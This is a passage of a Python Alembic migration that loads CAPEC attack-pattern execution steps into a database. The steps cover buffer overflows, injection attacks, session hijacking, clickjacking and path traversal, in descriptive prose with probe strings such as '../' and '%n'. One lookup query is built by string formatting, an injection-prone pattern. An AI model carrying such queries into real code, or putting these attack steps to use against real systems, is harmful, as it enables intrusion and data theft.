"""update fixture execution flow

Revision ID: dbcc0684af69
Revises: a8741ff87139
Create Date: 2022-04-11 21:27:51.326910

"""
from alembic import op
import sqlalchemy as sa
from sqlalchemy import text, MetaData, Table

# revision identifiers, used by Alembic.
revision = 'dbcc0684af69'
down_revision = 'a8741ff87139'
branch_labels = None
depends_on = None


def upgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    insert_all_data()
    # ### end Alembic commands ###


def downgrade():
    # ### commands auto generated by Alembic - please adjust! ###
    pass
    # ### end Alembic commands ###

def insert_config(data):
    conn = op.get_bind()
    app_data = conn.execute(
        "SELECT * FROM execute_flow WHERE id = {}".format(data.get("id"))
    )
    if app_data.first():
        query_text = text(
            "UPDATE execute_flow SET id = :id, capec_id = :capec_id, step1 = :step1, step2 = :step2, step3 = :step3, step4 = :step4, step5 = :step5, step6 = :step6, step7 = :step7, step8 = :step8, step9 = :step9, step10 = :step10"
            " WHERE id = :id"
        )
        conn.execute(
            query_text,
            {
                'id': data.get("id"),
                'capec_id': data.get("capec_id"),
                'step1': data.get("step1"),
                'step2': data.get("step2"),
                'step3': data.get("step3"),
                'step4' : data.get("step4"),
                'step5' : data.get("step5"),
                'step6' : data.get("step6"),
                'step7' : data.get("step7"),
                'step8' : data.get("step8"),
                'step9' : data.get("step9"),
                'step10' : data.get("step10"),
            }
        )
    else:
        meta = MetaData(bind=op.get_bind())
        meta.reflect(only=('execute_flow',))
        some_table_tbl = Table('execute_flow', meta)
        op.bulk_insert(
            some_table_tbl,[data]
        )

def insert_all_data():
    data = json_data()
    for single_data in data:
        insert_config(single_data)

def json_data():
    data = data = [
    {
        "id": 1,
        "capec_id": "1",
        "step1": " [Survey] The attacker surveys the target application, possibly as a valid and authenticated user. - Spidering web sites for all available links. - Brute force guessing of resource names. - Brute force guessing of user names / credentials. - Brute force guessing of function names / actions ",
        "step2": " [Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions. - Use the web inventory of all forms and inputs and apply attack data to those inputs.. - Use a packet sniffer to capture and record network traffic. - Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment. ",
        "step3": " [Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.. - Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters).\n"
    },
    {
        "id": 2,
        "capec_id": "10",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack the adversary looks for an application that loads the content of an environment variable into a buffer. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - Change the values of environment variables thought to be used by the application to contain excessive data. If the program is loading the value of the environment variable into a buffer, this could cause a crash and an attack vector will be found. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.\n"
    },
    {
        "id": 3,
        "capec_id": "100",
        "step1": " [Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible. ",
        "step3": " [Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.. - Create malicious shellcode that will execute when the program execution is returned to it.. - Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs ",
        "step4": " [Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.\n"
    },
    {
        "id": 4,
        "capec_id": "101",
        "step1": " [Determine applicability] The adversary determines whether server side includes are enabled on the target web server.. - Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.. - Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it. ",
        "step2": " [Find Injection Point] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.. - Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms. ",
        "step3": " [Inject SSI] Using the found injection point, the adversary sends arbitrary code to be inlcuded by the application on the server side. They may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the adversary.\n"
    },
    {
        "id": 5,
        "capec_id": "102",
        "step1": " [Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.. - The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies their knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens. ",
        "step2": " [Capture session token] The attacker uses sniffing tools to capture a session token from traffic. ",
        "step3": " [Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation. ",
        "step4": " [Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.\n"
    },
    {
        "id": 6,
        "capec_id": "103",
        "step1": " [Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking page. - The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page. - The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page. - The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page. - The adversary leveraged cross-frame scripting to craft a malicious clickjacking page ",
        "step2": " [Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.. - Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.. - Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.. - Lure the victim to the malicious site through a cross-site scripting attack. ",
        "step3": " [Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.. - Hide action controls over very commonly used functionality.. - Hide action controls over very psychologically tempting content.\n"
    },
    {
        "id": 7,
        "capec_id": "104",
        "step1": " [Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.. - Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place. ",
        "step2": " [Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.. - Finding weaknesses in functionality used by both privileged and unprivileged users. ",
        "step3": " [Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.. - The attacker makes it as likely as possible that the vulnerable functionality into which they have injected the payload has a high likelihood of being used by the victim.. - Leverage cross-site scripting vulnerability to inject payload.\n"
    },
    {
        "id": 8,
        "capec_id": "105",
        "step1": " [Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.. - Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.",
        "step2": " [Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering. ",
        "step3": " [Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests with custom strings and embedded web scripts and objects in HTTP headers to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.. - Continue the monitoring of HTTP traffic.. - Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.. - Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request. ",
        "step4": " :[Perform HTTP Request Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.. - Leverage techniques identified in the Experiment Phase.\n"
    },
    {
        "id": 9,
        "capec_id": "106"
    },
    {
        "id": 10,
        "capec_id": "107",
        "step1": " [Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has an active session. - An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response. ",
        "step2": " [Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.. - The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request. ",
        "step3": " [Create a malicious script that pings the web server with HTTP TRACE request] The adversary creates a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.. - The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response. ",
        "step4": " [Execute malicious HTTP Trace launching script] The adversary leverages an XSS vulnerability to force the victim to execute the malicious HTTP Trace launching script ",
        "step5": " [Intercept HTTP TRACE response] The adversary's script intercepts the HTTP TRACE response from teh web server, glance sensitive information from it, and forward that information to a server controlled by the adversary.\n"
    },
    {
        "id": 11,
        "capec_id": "108",
        "step1": " [Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query. ",
        "step2": " [Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive. ",
        "step3": " [Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument ",
        "step4": " [Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.\n"
    },
    {
        "id": 12,
        "capec_id": "109",
        "step1": " [Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.. - An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there. ",
        "step2": " [Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content. ",
        "step3": " [Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.. - An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.\n"
    },
    {
        "id": 13,
        "capec_id": "11",
        "step1": " [Footprint file input vectors] Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.. - Attacker manually crawls application to identify file inputs. - Attacker uses an automated tool to crawl application identify file inputs. - Attacker manually assesses strength of access control protecting native application files from user control. - Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests ",
        "step2": " [File misclassification shotgunning] An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.. - Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.. - Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server. ",
        "step3": " [File misclassification sniping] Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.. - Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.. - Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server. ",
        "step4": " [Disclose information] The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).. - Manipulate the file names that are explicitly sent to the server.. - Manipulate the MIME sent in order to confuse the web server.\n"
    },
    {
        "id": 14,
        "capec_id": "110",
        "step1": " [Detect Incorrect SOAP Parameter Handling] The attacker tampers with the SOAP message parameters and looks for indications that the tampering caused a change in behavior of the targeted application.. - The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior. ",
        "step2": " [Probe for SQL Injection vulnerability] The attacker injects SQL syntax into vulnerable SOAP parameters identified during the Explore phase to search for unfiltered execution of the SQL syntax in a query. ",
        "step3": " [Inject SQL via SOAP Parameters] The attacker injects SQL via SOAP parameters identified as vulnerable during Explore phase to launch a first or second order SQL injection attack.. - An attacker performs a SQL injection attack via the usual methods leveraging SOAP parameters as the injection vector. An attacker has to be careful not to break the XML parser at the service provider which may prevent the payload getting through to the SQL query. The attacker may also look at the WSDL for the web service (if available) to better understand what is expected by the service provider.\n"
    },
    {
        "id": 15,
        "capec_id": "111",
        "step1": " [Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.. - An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit. ",
        "step2": " [Craft a malicious website]The attacker crafts a malicious website to which they plan to lure the victim who is using the vulnerable target system. The malicious website does two things: 1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest). 2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker. This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain. ",
        "step3": " [Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get their malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.. - An attacker employs a myriad of standard techniques to get the victim to visit their malicious site or by some other means get the attackers' malicious code executing in the victim's browser.\n"
    },
    {
        "id": 16,
        "capec_id": "112",
        "step1": " [Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.. - Determine if there is a way to parallelize the attack. Most brute force attacks can take advantage of parallel techniques by dividing the search space among available resources, thus dividing the average time to success by the number of resources available. If there is a single choke point, such as a need to check answers with an external authority, the attackers' position is significantly degraded. ",
        "step2": " [Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.. - If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.). - If the secret was chosen algorithmically, cryptanalysis can be applied to the algorithm to discover patterns in this algorithm. (This is true even if the secret is not used in cryptography.) Periodicity, the need for seed values, or weaknesses in the generator all can result in a significantly smaller secret space.. - If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.. - Some algorithmic techniques for secret selection may leave indicators that can be tested for relatively easily and which could then be used to eliminate large areas of the search space for consideration. For example, it may be possible to determine that a secret does or does not start with a given character after a relatively small number of tests. Alternatively, it might be possible to discover the length of the secret relatively easily. These discoveries would significantly reduce the search space, thus increasing speed with which the attacker discovers the secret. ",
        "step3": " [Expand victory conditions] It is sometimes possible to expand victory conditions. For example, the attacker might not need to know the exact secret but simply needs a value that produces the same result using a one-way function. While doing this does not reduce the size of the search space, the presence of multiple victory conditions does reduce the likely amount of time that the attacker will need to explore the space before finding a workable value. ",
        "step4": " [Gather information so attack can be performed independently.] If possible, gather the necessary information so a successful search can be determined without consultation of an external authority. This can be accomplished by capturing cryptotext (if the goal is decoding the text) or the encrypted password dictionary (if the goal is learning passwords).\n"
    },
    {
        "id": 17,
        "capec_id": "113"
    },
    {
        "id": 18,
        "capec_id": "114"
    },
    {
        "id": 19,
        "capec_id": "115"
    },
    {
        "id": 20,
        "capec_id": "116"
    },
    {
        "id": 21,
        "capec_id": "117"
    },
    {
        "id": 22,
        "capec_id": "12",
        "step1": " [Determine Nature of Messages] Determine the nature of messages being transported as well as the identifiers to be used as part of the attack ",
        "step2": " [Authenticate] If required, authenticate to the distribution channel ",
        "step3": " [Identify Known Client Identifiers] If any particular client's information is available through a control channel available to all users, the adversary will discover particular identifiers for targeted clients by observing this channel, or requesting client information through this channel. ",
        "step4": " [Change Message Identifier] Adversaries with client access connecting to output channels could change their channel identifier and see someone else's (perhaps more privileged) data.\n"
    },
    {
        "id": 23,
        "capec_id": "120",
        "step1": " [Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.. - Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.. - Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.. - Manually inspect the application to find entry points. ",
        "step2": " [Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.. - Try to use double-encoding to bypass validation routines.\n"
    },
    {
        "id": 24,
        "capec_id": "121",
        "step1": " [Determine Vulnerable Interface] An adversary explores a target system for sample or test interfaces that have not been disabled by a system administrator and which may be exploitable by the adversary.. - If needed, the adversary explores an organization's network to determine if any specific systems of interest exist. ",
        "step2": " [Leverage Test Interface to Execute Attacks] Once an adversary has discovered a system with a non-production interface, the interface is leveraged to exploit the system and/or conduct various attacks.. - The adversary can leverage the sample or test interface to conduct several types of attacks such as Adversary-in-the-Middle attacks (CAPEC-94), keylogging, Cross Site Scripting (XSS), hardware manipulation attacks, and more.\n"
    },
    {
        "id": 25,
        "capec_id": "122"
    },
    {
        "id": 26,
        "capec_id": "123"
    },
    {
        "id": 27,
        "capec_id": "124"
    },
    {
        "id": 28,
        "capec_id": "125"
    },
    {
        "id": 29,
        "capec_id": "126",
        "step1": " [Fingerprinting of the operating system] In order to perform a valid path traversal, the attacker needs to know what the underlying OS is so that the proper file seperator is used.. - Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.. - TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.. - Induce errors to find informative error messages ",
        "step2": " [Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable file inputs ",
        "step3": " [Vary inputs, looking for malicious results] Depending on whether the application being exploited is a remote or local one, the attacker crafts the appropriate malicious input containing the path of the targeted file or other file system control syntax to be passed to the application ",
        "step4": " [Manipulate files accessible by the application] The attacker may steal information or directly manipulate files (delete, copy, flush, etc.).\n"
    },
    {
        "id": 30,
        "capec_id": "127",
        "step1": " [Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.. - Send requests to the web server for common directory names. - If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.. - Search for uncommon or potentially user created directories that may be present. ",
        "step2": " [Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods. - Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.. - Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.. - Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.. - Sequentially request a list of common base files to each directory discovered.. - Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a / request ",
        "step3": " [Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods. - Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a / request. - Try other known exploits to elevate privileges sufficient to bypass protected directories.. - List the files in the directory by issuing a request with the URL ending in a / slash.. - Access the files via direct URL and capture contents.. - Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.. - Sequentially request a list of common base files to each directory discovered.\n"
    },
    {
        "id": 31,
        "capec_id": "128"
    },
    {
        "id": 32,
        "capec_id": "129"
    },
    {
        "id": 33,
        "capec_id": "13",
        "step1": " [Probe target application] The adversary first probes the target application to determine important information about the target. This information could include types software used, software versions, what user input the application consumes, and so on. Most importantly, the adversary tries to determine what environment variables might be used by the underlying software, or even the application itself. ",
        "step2": " [Find user-controlled environment variables] Using the information found by probing the application, the adversary attempts to manipulate any user-controlled environment variables they have found are being used by the application, or suspect are being used by the application, and observe the effects of these changes. If the adversary notices any significant changes to the application, they will know that a certain environment variable is important to the application behavior and indicates a possible attack vector.. - Alter known environment variables such as $PATH, $HOSTNAME, or LD_LIBRARY_PATH and see if application behavior changes. ",
        "step3": " [Manipulate user-controlled environment variables] The adversary manipulates the found environment variable(s) to abuse the normal flow of processes or to gain access to privileged resources.\n"
    },
    {
        "id": 34,
        "capec_id": "130"
    },
    {
        "id": 35,
        "capec_id": "131"
    },
    {
        "id": 36,
        "capec_id": "132",
        "step1": " [Identify Target] Adversary identifies the target application by determining whether there is sufficient check before writing data to a file and creating symlinks to files in different directories.. - The adversary writes to files in different directories to check whether the application has sufficient checking before file operations.. - The adversary creates symlinks to files in different directories. ",
        "step2": " [Try to create symlinks to different files] The adversary then uses a variety of techniques, such as monitoring or guessing to create symlinks to the files accessed by the target application in the directories which are identified in the explore phase.. - The adversary monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the adversary can delay the operations by using sleep(2) and usleep() to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.. - The adversary may need a little guesswork on the filenames on which the target application would operate.. - The adversary tries to create symlinks to the various filenames. ",
        "step3": " [Target application operates on created symlinks to sensitive files] The adversary is able to create symlinks to sensitive files while the target application is operating on the file.. - Create the symlink to the sensitive file such as configuration files, etc.\n"
    },
    {
        "id": 37,
        "capec_id": "133",
        "step1": " [Identify application] Discover an application of interest by exploring service registry listings or by connecting on a known port or some similar means.. - Search via internet for known, published applications that allow option switches.. - Use automated tools to scan known ports to identify applications that might be accessible ",
        "step2": " [Authenticate to application] Authenticate to the application, if required, in order to explore it.. - Use published credentials to access system.. - Find unpublished credentails to access service.. - Use other attack pattern or weakness to bypass authentication. ",
        "step3": " [Try all common switches] Using manual or automated means, attempt to run the application with many different known common switches. Observe the output to see if any switches seemed to put the application in a non production mode that might give more information.. - Manually execute the application with switches such as --debug, --test, --development, --verbose, etc.. - Use automated tools to run the application with common switches and observe the output ",
        "step4": " [Use sensitive processing or configuration information] Once extra information is observed from an application through the use of a common switch, this information is used to aid other attacks on the application. - Using application information, formulate an attack on the application.\n"
    },
    {
        "id": 38,
        "capec_id": "134"
    },
    {
        "id": 39,
        "capec_id": "135",
        "step1": " [Survey application] The adversary takes an inventory of the entry points of the application.. - Spider web sites for all available links. - List parameters, external variables, configuration files variables, etc. that are possibly used by the application. ",
        "step2": " [Determine user-controllable input susceptible to format string injection] Determine the user-controllable input susceptible to format string injection. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.. - Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters. ",
        "step3": " [Try to exploit the Format String Injection vulnerability] After determining that a given input is vulnerable to format string injection, hypothesize what the underlying usage looks like and the associated constraints.. - Insert various formatting characters to read or write the memory, e.g. overwrite return address, etc.\n"
    },
    {
        "id": 40,
        "capec_id": "136",
        "step1": " [Survey application] The attacker takes an inventory of the entry points of the application.. - Spider web sites for all available links. - Sniff network communications with application using a utility such as WireShark. ",
        "step2": " [Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax. - Use web browser to inject input through text fields or through HTTP GET parameters. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.. - Use modified client (modified by reverse engineering) to inject input. ",
        "step3": " [Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.. - Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.. - Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.\n"
    },
    {
        "id": 41,
        "capec_id": "137"
    },
    {
        "id": 42,
        "capec_id": "138"
    },
    {
        "id": 43,
        "capec_id": "139",
        "step1": " [Fingerprinting of the operating system] In order to perform a valid path traversal, the adversary needs to know what the underlying OS is so that the proper file seperator is used.. - Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.. - TCP/IP Fingerprinting. The adversary uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.. - Induce errors to find informative error messages ",
        "step2": " [Survey application] Using manual or automated means, an adversary will survey the target application looking for all areas where user input is taken to specify a file name or path.. - Use a spidering tool to follow and record all links on a web page. Make special note of any links that include parameters in the URL.. - Use a proxy tool to record all links visited during a manual traversal of a web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.. - Use a browser to manually explore a website and analyze how it is constructed. Many browser plug-ins are available to facilitate the analysis or automate the URL discovery. ",
        "step3": " [Attempt variations on input parameters] Using manual or automated means, an adversary attempts varying relative file path combinations on all found user input locations and observes the responses.. - Provide ../ or .. at the beginning of any filename to traverse to the parent directory. - Use a list of probe strings as path traversal payload. Different strings may be used for different platforms. Strings contain relative path sequences such as ../.. - Use a proxy tool to record results of manual input of relative path traversal probes in known URLs. ",
        "step4": " [Access, modify, or execute arbitrary files.] An adversary injects path traversal syntax into identified vulnerable inputs to cause inappropriate reading, writing or execution of files. An adversary could be able to read directories or files which they are normally not allowed to read. The adversary could also access data outside the web document root, or include scripts, source code and other kinds of files from external websites. Once the adversary accesses arbitrary files, they could also modify files. In particular situations, the adversary could also execute arbitrary code or system commands.. - Manipulate file and its path by injecting relative path sequences (e.g. ../).. - Download files, modify files, or try to execute shell commands (with binary files).\n"
    },
    {
        "id": 44,
        "capec_id": "14",
        "step1": " [Identify target client-side application] The adversary identifies a target client-side application to perform the buffer overflow on. The most common are browsers. If there is a known browser vulnerability an adversary could target that. ",
        "step2": " [Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.. - Many times client side applications will be open source, so an adversary can examine the source code to identify possible injection vectors.. - Examine APIs of the client-side application and look for areas where a buffer overflow might be possible. ",
